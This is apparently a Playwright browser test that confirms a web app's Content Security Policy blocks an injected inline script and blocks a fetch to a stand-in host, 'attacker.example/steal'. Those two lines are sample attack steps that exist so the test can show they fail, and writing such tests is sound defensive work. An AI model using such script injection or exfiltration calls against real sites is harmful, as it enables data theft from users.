import { expect, test } from './helpers/test'

test('the built app blocks inline scripts and network requests to unknown hosts', async ({ page }) => {
  const violations: string[] = []
  page.on('console', (msg) => msg.text().includes('Content Security Policy') && violations.push(msg.text()))
  await page.goto('/app')
  await expect(page.getByRole('heading', { name: 'Projects' })).toBeVisible()

  const inlineRan = await page.evaluate(() => {
    const script = document.createElement('script')
    script.textContent = 'window.__inline = true'
    document.body.appendChild(script)
    return (window as { __inline?: boolean }).__inline === true
  })
  expect(inlineRan).toBe(false)

  const exfiltrated = await page.evaluate(() => fetch('https://attacker.example/steal').then(() => true, () => false))
  expect(exfiltrated).toBe(false)
  expect(violations.length).toBeGreaterThan(0)
})
